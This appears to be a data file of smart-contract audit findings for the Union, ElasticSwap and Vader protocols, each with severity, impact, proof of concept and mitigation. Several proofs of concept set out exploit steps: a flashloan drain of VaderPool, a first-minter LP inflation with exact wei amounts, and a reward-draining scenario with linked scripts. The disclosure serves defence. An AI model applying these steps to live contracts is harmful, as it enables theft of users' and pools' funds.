*   10 stakers each give `100` of `vouchingAmount` to Alice;
*   Alice borrows `100`;

The protocol will now lock `100` of each of the 10 stakers, making the total locked amount being `1000`."
45.md,Rebalance will fail due to low precision of percentages,medium,"The `AssetManager.rebalance` function has a check at the end to ensure that all tokens are deposited again:

```solidity
require(token.balanceOf(address(this)) == 0, ""AssetManager: there are remaining funds in the fund pool"");
```

The idea is that the last market deposits all `remainingTokens` but the last market does not have to support the token in which case the transaction will fail, or the `percentages` parameter needs to be chosen to distribute all tokens before the last one (they need to add up to `1e4`). However, these percentages have a low precision as they are in base points, i.e, the lowest unit is `1 = 0.01%`.
This will leave dust in the contract in most cases as the tokens have much higher precision.

#### POC
Assume the last market does not support the token and thus `percentages` are chosen as `[5000, 5000]` to rebalance the first two markets.
Withdrawing all tokens form the markets leads to a `tokenSupply = token.balanceOf(address(this)) = 10,001`:

Then the deposited amount is `amountToDeposit = (tokenSupply * percentages[i]) / 10000 = 10,001 * 5,000 / 10,000 = 5,000`.
The two deposits will leave dust of `10,001 - 2 * 5,000 = 1` in the contract and the `token.balanceOf(address(this)) == 0` balance check will revert.

#### Impact
Rebalancing will fail in most cases if the last market does not support the token due to precision errors.

#### Recommended Mitigation Steps
Remove the final zero balance check, or make sure that the last market that is actually deposited to receives all remaining tokens."
45.md,`UnionToken` should check whitelist on `from`?,medium,"The `UnionToken` can check for a whitelist on each transfer in `_beforeTokenTransfer`:

```solidity
if (whitelistEnabled) {
    require(isWhitelisted(msg.sender) || to == address(0), ""Whitelistable: address not whitelisted"");
}
```

This whitelist is checked on `msg.sender` not on `from`, the token owner.

#### Impact
A single whitelisted account can act as an operator (everyone calls `unionToken.allow(operator, max)` where the operator is a whitelisted trusted smart contract) for all other accounts. This essentially bypasses the whitelist.

#### Recommended Mitigation Steps
Think about if the whitelist on `msg.sender` is correct or if it should be on `from`."
45.md,Change in interest rate can disable repay of loan,medium,"#### Impact
The ability of a borrower to repay a loan is disabled if the interest rate is
set too high by the `InterestRateModel`.

However, there is neither a check when setting the interest rate nor an
indication in the `IInterestRateModel`'s specs of this behavior.

But this issue could also be used in an adversarial fashion by the
`FixedInterestRateModel`-owner if he/she would disable the repay functionality
for some time and enables it at a later point again with the demand of a
higher interest to be paid by the borrower.

#### Proof of Concept
If an account wants to repay a loan, the function
`UToken::_repayBorrowFresh()` is used. This function calls
`UToken::accrueInterest()` ([line](https://github.com/code-423n4/2021-10-union/blob/main/contracts/market/UToken.sol#L465) 465)
which fetches the current borrow rate of the interest rate model
([line](https://github.com/code-423n4/2021-10-union/blob/main/contracts/market/UToken.sol#L546) 546
and [line](https://github.com/code-423n4/2021-10-union/blob/main/contracts/market/UToken.sol#L330) 330).

The function `UToken::borrowRatePerBlock()` requires an not ""absurdly high""
rate, or fails otherwise ([line](https://github.com/code-423n4/2021-10-union/blob/main/contracts/market/UToken.sol#L331) 331).

However, there is no check or indicator in `FixedInterestRateModel.sol` to
prevent the owner to set such a high rate that effectively disables repay
of borrowed funds ([line](https://github.com/code-423n4/2021-10-union/blob/main/contracts/market/FixedInterestRateModel.sol#L36) 36).

#### Recommended Mitigation Steps
Disallow setting the interest rate too high with a check in
`FixedInterestRateModel::setInterestRate()`."
45.md,Comptroller rewards can be artificially inflated and drained by manipulating [totalStaked - totalFrozen] (or: wrong rewards calculation),medium,"By adding a small of amount of staking to a normal user scenario, and not approving this small amount as a loan for anybody, a staker can gain disproportionate amounts of comptroller rewards, even to the point of draining the contract.
For example:
Stakers A,B,C stake 100, 65, 20, approve it for borrower Z, then staker B stakes an additional 0.07 DAI, and borrower Z borrows 185. This will result in disproportionate amount of rewards.

As far as I see, this is the main line that causes the inflated amount (*deep breath*):
In `calculateRewardsByBlocks`, you set:

```solidity
userManagerData.totalStaked = userManagerContract.totalStaked() - userManagerData.totalFrozen;
```

[`Comptroller.sol` L140](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L140)

Note that a staker can make this amount very small (depending of course on the current numbers of the protocol).
(A more advanced attacker might diminish the effect of the current numbers of the protocol by initiating fake loans to himself and not paying them.)
This field is then passed to `calculateRewards`, and passed further to `getInflationIndexNew`, and further to `getInflationIndex`.
passed to `calculateRewards` : [`Comptroller.sol` L167](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L167)

passed to `getInflationIndexNew` : [`Comptroller.sol` L259](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L259)

passed to `getInflationIndex` :  [`Comptroller.sol` L238](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L238)

Now we actually use it in the following line (as `effectiveAmount`):
```solidity
return blockDelta * inflationPerBlock(effectiveAmount).wadDiv(effectiveAmount) + inflationIndex;
```

[`Comptroller.sol` L315](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L315)

So 2 things are happening here:

1.  mul by `inflationPerBlock(effectiveAmount)` - uses the lookup table in Comptroller. This value gets bigger as effectiveAmount gets smaller, and if effectiveAmount is in the area of 10\*\*18, we will get the maximum amount of the lookup.
2.  div by `effectiveAmount` - as we saw, this can be made small, thereby enlarging the result.

All together, this calculation will be set to `curInflationIndex` and then used in the following line:

    return (curInflationIndex - startInflationIndex).wadMul(effectiveStakeAmount).wadMul(inflationIndex);

[`Comptroller.sol` L263](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L263)

Note the `curInflationIndex - startInflationIndex`: per my POC (see below), this can result in a curInflationIndex which is orders of magnitude larger (200x) than startInflationIndex. This creates a huge inflation of rewards.

#### Impact
Comptroller rewards can be drained.

#### Proof of Concept
See the following script for a POC of reward drainage. It is based on the scenario in test/integration/`testUserManager`:

Stakers A,B,C stake 100, 65, 20, and borrower Z borrows 185. But the difference in my script is that just before borrower Z borrows 185, staker B stakes an additional 0.07 DAI. (This will be the small amount that is `totalStaked - totalFrozen`).

Then, we wait 11 blocks to make the loan overdue, call `updateOverdueInfo` so `totalFrozen` would be updated, and then staker B calls `withdrawRewards`.
He ends up with 873 unionTokens out of the 1000 the Comptroller has been seeded with. And this number can be enlarged by changing the small additional amount that staker B staked.

In this scenario, when calling `withdrawRewards`, the calculated `curInflationIndex` will be 215 WAD, while `startInflationIndex` is 1 WAD, and this is the main issue as I understand it.

File password: ""union"".
https://pastebin.com/3bJF8mTe

#### Tools Used
Manual analysis, hardhat

#### Recommended Mitigation Steps
Are you sure that this line should deduct the `totalFrozen`?
```solidity
userManagerData.totalStaked = userManagerContract.totalStaked() - userManagerData.totalFrozen;
```

[`Comptroller.sol` L140](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L140)

Per my tests, if we change it to just
```solidity
userManagerData.totalStaked = userManagerContract.totalStaked();
```

Then we are getting normal results again and no drainage. And the var *is* called just `totalStaked`...
So maybe this is the change that needs to be made? But maybe you have a reason to deduct the `totalFrozen`.
If so, then a mitigation will perhaps be to limit curInflationIndex somehow, maybe by changing the lookup table, or limiting it to a percentage from startInflationIndex ; but even then, there is also the issue of dividing by `userManagerData.totalStaked` which can be made quite small as the user has control over that."
45.md,"debtWriteOff updates `totalFrozen` immaturely, thereby losing staker rewards",medium,"`debtWriteOff` updates `totalFrozen` before withdrawing `unionToken` rewards.
As the borrower is overdue, this means the staker calling debtWriteOff will lose his rewards if for example `totalStaked` == `totalFrozen`.
(Note: If the borrower would to first call `withdrawRewards`/stake/unstake before calling debtWriteOff, he would get the rewards.)

#### Impact
Staker loses rewards.
(Or at the very least, inconsistency at rewards calculation between debtWriteOff and stake/unstake/`withdrawRewards`.)

#### Proof of Concept
`debtWriteOff` first calls `updateTotalFrozen`, and then `comptroller.withdrawRewards`: [`L710:` L712](https://github.com/code-423n4/2021-10-union/blob/main/contracts/user/UserManager.sol#L710:#L712)

`updateTotalFrozen` can update `totalFrozen` to be same as `totalStaked`.
`comptroller.withdrawRewards` calls `calculateRewardsByBlocks`: [`Comptroller.sol` L98](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L98)

`calculateRewardsByBlocks` is calculating `userManagerContract.totalStaked() - userManagerData.totalFrozen`, which can be 0 in certain cases,
[`Comptroller.sol` L140](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L140)

and passing it as the third parameter to `calculateRewards`: [`Comptroller.sol` L167](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L167)

In `calculateRewards`, if the third parameter is 0, the user won't get any rewards.

[`Comptroller.sol` L253](https://github.com/code-423n4/2021-10-union/blob/main/contracts/token/Comptroller.sol#L253)

So in this scenario the user won't get any rewards after calling `debtWriteOff`.

If we were to call `updateTotalFrozen` *after* the withdrawing of the rewards, or if the staker would call `withdrawRewards` before calling `debtWriteOff`, the `totalFrozen` would not have been updated, and the user would get his rewards by calling `debtWriteOff`.
As I mentioned earlier, if there's a reason I'm not seeing as to why `updateTotalFrozen` is updated in `debtWriteOff` before `withdrawRewards` is called, then it is not consistent with stake/unstake/`withdrawRewards` functions.

I have a created an (admittedly hacky) script to show the bug.
It will run two scenarios which are almost the same (based on integration/`testUserManager`.js).
In the first the staker will call `debtWriteOff` at some point,
and at the second the staker will call `withdrawRewards` at the same point,
and the test will print the difference in unionToken balance after each call.
File password: ""union"".
<https://pastebin.com/xkS0PXtq>

#### Tools Used
Manual analysis, hardhat.

#### Recommended Mitigation Steps
If I am not missing anything, in `debtWriteOff` I would move the `withdrawRewards` to before `updateTotalFrozen`.

[`UserManager.sol` L710:L712](https://github.com/code-423n4/2021-10-union/blob/main/contracts/user/UserManager.sol#L710:#L712)"
45.md,`UserManager`: `totalStaked` ≥ totalFrozen should be checked before and after totalFrozen is updated,medium,The require statement in `updateTotalFrozen` and `batchUpdateTotalFrozen` to check that `totalStaked` ≥ `totalFrozen` should be done both before and after `_updateTotalFrozen` is called to ensure that totalStake is still ≥ `totalFrozen`. This will serve as a sanity check to ensure that the integrity of the system is not compromised.
45.md,`MAX_TRUST_LIMIT` might be too high,medium,"Both `SumOfTrust.sol` and `CreditLimitByMedian.sol` contain an expensive sort function. This is used by `UserManager.sol` via the functions `getLockedAmount` and `getCreditLimit`.

If the list of stakers would be very long then the sort would take up all the gas and revert.
Attackers could make the list of stakers longer by voting in themselves (as soon as they have 3 accounts voted in), this would result in a griefing attack.

Luckily the number of stakers and borrowers is limited in the function updateTrust by applying a limit of `MAX_TRUST_LIMIT`.

However this limit is quite high (100), if that amount of stakers would be present then an out of gas error would probably occur with the sort.
Note: there are also other for loops in the code that could have a similar problem, however sort is the most expensive.

#### Proof of Concept
- <https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/SumOfTrust.sol#L98-L121>
- <https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/CreditLimitByMedian.sol#L107-L122>
- <https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/UserManager.sol#L594>
- <https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/UserManager.sol#L368>
- <https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/UserManager.sol#L50>
- <https://github.com/code-423n4/2021-10-union/blob/4176c366986e6d1a6b3f6ec0079ba547b040ac0f/contracts/user/UserManager.sol#L423-L427>

#### Recommended Mitigation Steps
Do a test with a `MAX_TRUST_LIMIT` number of stakers and borrowers and check if the code still works.

Set the `MAX_TRUST_LIMIT` so that everything still works, probably include a margin for future changes in gas costs."
45.md,Duplicate `utoken` and `usermanager` can be added which cannot be deleted,medium,"If Admin decides to delete the market, only the first instance of `utoken` and `usermanager` gets deleted. This means duplicate instance remains and Admin has actually not deleted the market

#### Proof of Concept
1.  Navigate to <https://github.com/code-423n4/2021-10-union/blob/main/contracts/market/MarketRegistry.sol>
2.  Check the `addUToken` function

```solidity
function addUToken(address token, address uToken) public newToken(token) onlyAdmin {
    uTokenList.push(uToken);
    tokens[token].uToken = uToken;
    emit LogAddUToken(token, uToken);
}
```

3.  As we can see there is no check to see if the utoken already existed in uTokenList which means now uTokenList can have now duplicate entries

4.  Same case goes for userManagerList

#### Recommended Mitigation Steps
Modify `addUToken` and `addUserManager` function to check if the usermanager/utoken already existed"
45.md,User Fund loss in case of Unsupported Market token deposit,medium,"#### Impact
User funds can be lost as current logic cannot withdraw unsupported market token even though deposit can be done for same

#### Proof of Concept

1.  Navigate to <https://github.com/code-423n4/2021-10-union/blob/main/contracts/asset/AssetManager.sol>

2.  Check the function deposit

```solidity
function deposit(address token, uint256 amount)
    external
    override
    whenNotPaused
    onlyAuth(token)
    nonReentrant
    returns (bool)
{
    ...

    bool remaining = true;
    if (isMarketSupported(token)) {
        ...
    }

    if (remaining) {
        poolToken.safeTransferFrom(msg.sender, address(this), amount);
    }

    ...
}
```

3.  If this function was called with unsupported market token then `isMarketSupported(token)` will result in false. Although remaining remains true. This means `poolToken.safeTransferFrom(msg.sender, address(this), amount);` will get executed and user money will be debited

```solidity
if (remaining) {
    poolToken.safeTransferFrom(msg.sender, address(this), amount);
}
```
4.  Lets say user decides to withdraw using withdraw function

```solidity
function withdraw(
    address token,
    address account,
    uint256 amount
) external override whenNotPaused nonReentrant onlyAuth(token) returns (bool) {
    ...

    if (isMarketSupported(token)) {
        ...
    }

    if (!_isUToken(msg.sender, token)) {
        balances[msg.sender][token] = balances[msg.sender][token] - amount + remaining;
        totalPrincipal[token] = totalPrincipal[token] - amount + remaining;
    }

    emit LogWithdraw(token, account, amount, remaining);

    return true;
}
```
5.  As User is trying to withdraw unsupported market token so `isMarketSupported` function will return false. This means user wont be able to withdraw the funds

#### Recommended Mitigation Steps
`Deposit` function should revert in case of non supported market tokens"
45.md,Rebalance will fail if a market has high utilization,medium,"The `AssetManager.rebalance` function iterates through the markets and withdraws **all** tokens in the `moneyMarkets[i].withdrawAll` call.

Note that in peer-to-peer lending protocols like Compound/Aave the borrower takes the tokens from the supplier and it might not be possible for the supplier to withdraw all tokens if the utilisation ratio of the market is high.

See this check for example in [Compound's cToken](https://github.com/compound-finance/compound-protocol/blob/master/contracts/CToken.sol#L680).

#### Impact
Rebalancing will fail if a single market has a liquidity crunch.

#### Recommended Mitigation Steps
Withdraw only what's available and rebalance on that instead of trying to pull all tokens from each market first.
Admittedly, this might be hard to compute for some protocols."
77.md,"In the case of Single Asset Entry, new liquidity providers will suffer fund loss due to wrong formula of ΔRo",high,"### Current Implementation

#### When `baseToken` rebase up

Per the document: <https://github.com/ElasticSwap/elasticswap/blob/a90bb67e2817d892b517da6c1ba6fae5303e9867/ElasticSwapMath.md#:~:text=When%20there%20is%20alphaDecay>

and related code: <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L227-L283>

`Gamma` is the ratio of shares received by the new liquidity provider when `addLiquidity()` (ΔRo) to the new totalSupply (total shares = Ro' = Ro + ΔRo).

    ΔRo = (Ro/(1 - γ)) * γ

            Ro * Gamma
        = --------------
             1 - Gamma
    ⟺
    ΔRo * ( 1 - Gamma ) = Gamma * Ro
    ΔRo - Gamma * ΔRo = Gamma * Ro
    ΔRo = Gamma * Ro + Gamma * ΔRo
               ΔRo    
    Gamma = ---------
             Ro + ΔRo 

In the current implementation:

    γ = ΔY / Y' / 2 * ( ΔX / α^ )

ΔY is the `quoteToken` added by the new liquidity provider. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L277>

Y' is the new Y after `addLiquidity()`, `Y' = Y + ΔY`. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L272>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L278>

ΔX is `ΔY * Omega`. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L259-L263>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L279>

α^ is `Alpha - X`. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L234-L235>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L280>

For instance:

Given:

*   Original State: X = Alpha = 1, Y = Beta = 1, Omega = X/Y = 1
*   When `baseToken` rebase up: Alpha becomes 10
*   Current State: Alpha = 10, X = 1, Y = Beta = 1, Omega = 1

When: new liquidity provider `addLiquidity()` with 4 quoteToken:

                 4          4 * Omega      16
    Gamma = ------------ * ------------ = ----
             (1+4) * 2       10 - 1        90

After `addLiquidity()`:

*   baseToken belongs to the newLP: 10 \* 16 / 90 = 160 / 90 = 1.7777777777777777
*   quoteToken belongs to the newLP: (1+4) \* 16 / 90 = 80 / 90 = 0.8888888888888888
*   In the terms of `quoteToken`, the total value is: 160 / 90 / Omega + 80 / 90 = 240 / 90 = 2.6666666666666665

As a result, the new liquidity provider suffers a fund loss of `4 - 240 / 90 = 1.3333333333333333 in the terms of quoteToken`

The case above can be reproduced by changing the numbers in [this test unit](https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/test/exchangeTest.js#L1804).

#### When `baseToken` rebase down

Per the document: <https://github.com/ElasticSwap/elasticswap/blob/a90bb67e2817d892b517da6c1ba6fae5303e9867/ElasticSwapMath.md#:~:text=When%20there%20is%20betaDecay>

and related code: <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L297-L363>

`Gamma` is the ratio of shares received by the new liquidity provider when `addLiquidity()` (ΔRo) to the new totalSupply (total shares = Ro' = Ro + ΔRo).

    ΔRo = (Ro/(1 - γ)) * γ

            Ro * Gamma
        = --------------
             1 - Gamma
    ⟺
    ΔRo * ( 1 - Gamma ) = Gamma * Ro
    ΔRo - Gamma * ΔRo = Gamma * Ro
    ΔRo = Gamma * Ro + Gamma * ΔRo
               ΔRo    
    Gamma = ---------
             Ro + ΔRo 

In the current implementation:

    γ = ΔX / X / 2 * ( ΔXByQuoteTokenAmount / β^ )

ΔX is the amount of `baseToken` added by the new liquidity provider. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L357>

X is the balanceOf `baseToken`. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L358>

ΔXByQuoteTokenAmount is ΔX / Omega, the value of ΔX in the terms of `quoteToken`. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L318-L322>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L329-L333>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L359>

β^ is maxΔX / Omega, the value of maxΔX in the terms of `quoteToken`. `maxΔX = X - Alpha`. See:

*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L304-L305>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L318-L322>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L341-L342>
*   <https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L360>

For instance:

Given:

*   Original State: X = Alpha = 10, Y = Beta = 10, Omega = X/Y = 1
*   When `baseToken` rebase down, Alpha becomes 1
*   Current State: Alpha = 1, X = 10, Y = Beta = 10, Omega = 1

When: new liquidity provider `addLiquidity()` with `4 baseToken`

                4          4 / Omega       8
    Gamma = -------- * ---------------- = ----
              10 * 2    (10-1) / Omega     90

After `addLiquidity()`:

*   baseToken belongs to the newLP: (1 + 4) \* 8 / 90 = 40 / 90 = 0.4444444444444444
*   quoteToken belongs to the newLP: 10 \* 8 / 90 = 80 / 90 = 0.8888888888888888
*   In the terms of quoteToken, the total value is: 40 / 90 + 80 / 90 \* Omega = 120 / 90 = 1.3333333333333333 < 4

As a result, the new liquidity provider suffers a fund loss of `4 - 120 / 90 = 2.6666666666666665 in the terms of quoteToken`

The case above can be reproduced by changing the numbers in [this test unit](https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/test/exchangeTest.js#L2146).

### The correct formula for ΔRo

[See issue page for details.](https://github.com/code-423n4/2022-01-elasticswap-findings/issues/144)


### Recommendation

Update code and document using the correct formula for ΔRo.







***"
77.md,Transferring `quoteToken` to the exchange pool contract will cause future liquidity providers to lose funds,high,"In the current implementation, the amount of LP tokens to be minted when `addLiquidity()` is calculated based on the ratio between the amount of newly added `quoteToken` and the current wallet balance of `quoteToken` in the `Exchange` contract.

However, since anyone can transfer `quoteToken` to the contract, and make the balance of `quoteToken` to be larger than `_internalBalances.quoteTokenReserveQty`, existing liquidity providers can take advantage of this by donating `quoteToken` and make future liquidity providers receive fewer LP tokens than expected and lose funds.

<https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L578-L582>

```solidity
liquidityTokenQty = calculateLiquidityTokenQtyForDoubleAssetEntry(
    _totalSupplyOfLiquidityTokens,
    quoteTokenQty,
    _quoteTokenReserveQty // IERC20(quoteToken).balanceOf(address(this))
);
```

### PoC

Given:

*   The `Exchange` pool is new;

1.  Alice `addLiquidity()` with `1e18 baseToken` and `1e18 quoteToken`, recived `1e18` LP token;
2.  Alice transfer `99e18 quoteToken` to the `Exchange` pool contract;
3.  Bob `addLiquidity()` with `1e18 baseToken` and `1e18 quoteToken`;
4.  Bob `removeLiquidity()` with all the LP token in balance.

**Expected Results**: Bob recived `1e18 baseToken` and >= `1e18 quoteToken`.

**Actual Results**: Bob recived \~`0.02e18 baseToken` and \~`1e18 quoteToken`.

Alice can now `removeLiquidity()` and recive \~`1.98e18 baseToken` and \~`100e18 quoteToken`.

As a result, Bob suffers a fund loss of `0.98e18 baseToken`.

### Recommendation

Change to:

```solidity
liquidityTokenQty = calculateLiquidityTokenQtyForDoubleAssetEntry(
    _totalSupplyOfLiquidityTokens,
    quoteTokenQty,
    _internalBalances.quoteTokenReserveQty
);
```






***"
77.md,"The value of LP token can be manipulated by the first minister, which allows the attacker to dilute future liquidity providers' shares",medium,"For the first minter of an Exchange pool, the ratio of `X/Y` and the `totalSupply` of the LP token can be manipulated.

A sophisticated attacker can mint and burn all of the LP tokens but `1 Wei`, and then artificially create a situation of rebasing up by transferring baseToken to the pool contract. Then `addLiquidity()` in `singleAssetEntry` mode.

Due to the special design of `singleAssetEntry` mode, the value of LP token can be inflated very quickly.

As a result, `1 Wei` of LP token can be worthing a significate amount of baseToken and quoteToken.

Combine this with the precision loss when calculating the amount of LP tokens to be minted to the new liquidity provider, the attacker can turn the pool into a trap which will take a certain amount of cut for all future liquidity providers by minting fewer LP tokens to them.

<https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L493-L512>

```solidity
} else {
    // this user will set the initial pricing curve
    require(
        _baseTokenQtyDesired > 0,
        ""MathLib: INSUFFICIENT_BASE_QTY_DESIRED""
    );
    require(
        _quoteTokenQtyDesired > 0,
        ""MathLib: INSUFFICIENT_QUOTE_QTY_DESIRED""
    );

    tokenQtys.baseTokenQty = _baseTokenQtyDesired;
    tokenQtys.quoteTokenQty = _quoteTokenQtyDesired;
    tokenQtys.liquidityTokenQty = sqrt(
        _baseTokenQtyDesired * _quoteTokenQtyDesired
    );

    _internalBalances.baseTokenReserveQty += tokenQtys.baseTokenQty;
    _internalBalances.quoteTokenReserveQty += tokenQtys.quoteTokenQty;
}
```

<https://github.com/code-423n4/2022-01-elasticswap/blob/d107a198c0d10fbe254d69ffe5be3e40894ff078/elasticswap/src/libraries/MathLib.sol#L204-L212>

```solidity
function calculateLiquidityTokenQtyForDoubleAssetEntry(
    uint256 _totalSupplyOfLiquidityTokens,
    uint256 _quoteTokenQty,
    uint256 _quoteTokenReserveBalance
) public pure returns (uint256 liquidityTokenQty) {
    liquidityTokenQty =
        (_quoteTokenQty * _totalSupplyOfLiquidityTokens) /
        _quoteTokenReserveBalance;
}
```

### PoC

Given:

*   The `Pool` is newly created;
*   The market price of `baseToken` in terms of `quoteToken` is `1`.

The attacker can do the following steps in one tx:

1.  `addLiquidity()` with `2 Wei of baseToken` and `100e18 quoteToken`, received `14142135623` LP tokens;
2.  `removeLiquidity()` with `14142135622` LP tokens, the Pool state becomes:

*   totalSupply of LP tokens: 1 Wei
*   baseTokenReserveQty: 1 Wei
*   quoteTokenReserveQty: 7071067813 Wei

3.  `baseToken.transfer()` 7071067812 Wei to the Pool contract;
4.  `addLiquidity()` with no baseToken and `50e18 quoteToken`;
5.  `swapBaseTokenForQuoteToken()` with `600000000000000 baseToken`, the Pool state becomes:

*   totalSupply of LP tokens: 1 Wei
*   quoteTokenReserveQty 591021750159032
*   baseTokenReserveQty 600007071067801

6.  `baseToken.transfer()` 999399992928932200 Wei to the Pool contract;
7.  `addLiquidity()` with no baseToken and `1e18 quoteToken`, the Pool state becomes:

*   totalSupply of LP tokens: 1 Wei
*   quoteTokenReserveQty: 1000000000000000013
*   quoteTokenReserveQty: 985024641638342212
*   baseTokenDecay: 0

From now on, `addLiquidity()` with less than `1e18` of `baseToken` and `quoteToken` will receive `0` LP token due to precision loss.

The amounts can be manipulated to higher numbers and cause most future liquidity providers to receive fewer LP tokens than expected, and the attacker will be able to profit from it as the attacker will take a larger share of the pool than expected.

### Recommendation

Consider requiring a certain amount of minimal LP token amount (eg, 1e8) for the first minter and lock some of the first minter's LP tokens by minting \~1% of the initial amount to the factory address.







***"
52.md,Minting and burning synths exposes users to unlimited slippage,high,"#### Impact

The amount of synths minted / assets received when minting or burning synths can be manipulated to an unlimited extent by manipulating the reserves of the pool

#### Proof of Concept

See `VaderPool.mintSynth`:
<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>

Here a user sends `nativeDeposit` to the pool and the equivalent amount of `foreignAsset` is minted as a synth to be sent to the user. However the user can't specify the minimum amount of synth that they would accept. A frontrunner can then manipulate the reserves of the pool in order to make `foreignAsset` appear more valuable than it really is so the user receives synths which are worth much less than what `nativeDeposit` is worth. This is equivalent to a swap without a slippage limit.

Burning synths essentially runs the same process in behalf so manipulating the pool in the opposite direction will result in the user getting fewer of `nativeAsset` than they expect.

#### Recommended Mitigation Steps

Add a argument for the minimum amount of synths to mint or nativeAsset to receive."
52.md,Redemption value of synths can be manipulated to drain `VaderPool` of all native assets,high,"#### Impact

Draining of funds from `VaderPool`

#### Proof of Concept

See the `VaderPool.mintSynth` function:
<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167>

As the pool's reserves can be manipulated through flashloans similar to on UniswapV2, an attacker may set the exchange rate between `nativeAsset` and synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.

1.  The attacker first flashloans and sells a huge amount of `foreignAsset` to the pool. The pool now thinks `nativeAsset` is extremely valuable.
2.  The attacker now uses a relatively small amount of `nativeAsset` to mint synths using `VaderPool.mintSynth`. As the pool thinks `nativeAsset` is very valuable the attacker will receive a huge amount of synths.
3.  The attacker can now manipulate the pool in the opposite direction by buying up the `foreignAsset` they sold to the pool. `nativeAsset` is now back at its normal price, or perhaps artificially low if the attacker wishes.
4.  The attacker now burns all of their synths. As `nativeAsset` is considered much less valuable than at the point the synths were minted it takes a lot more of `nativeAsset` in order to pay out for the burned synths.

For the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount of `nativeAsset` from the pool. This process can be repeated as long as it is profitable.

#### Recommended Mitigation Steps

Prevent minting of synths or at the very least tie the exchange rate to a manipulation resistant oracle."
52.md,VADER contains a Fee-On-Transfer,high,"#### Impact

The whitepaper says that the Vader token contains a Fee-On-Transfer so in XVader.sol, an attacker may be able to keep calling `enter()` and `leave()` while being credited more tokens than the contract actually receives eventually draining it.

#### Proof of Concept

1.  Attacker deposits 500 Vader
2.  Attacker receives credit for 500 while the xVader contract gets the 500 - fee.
3.  Attacker calls `leave()` leaving the contract with a difference of the fee.

- <https://www.financegates.net/2021/07/28/another-polygon-yield-farm-crashes-to-zero-after-exploit/>

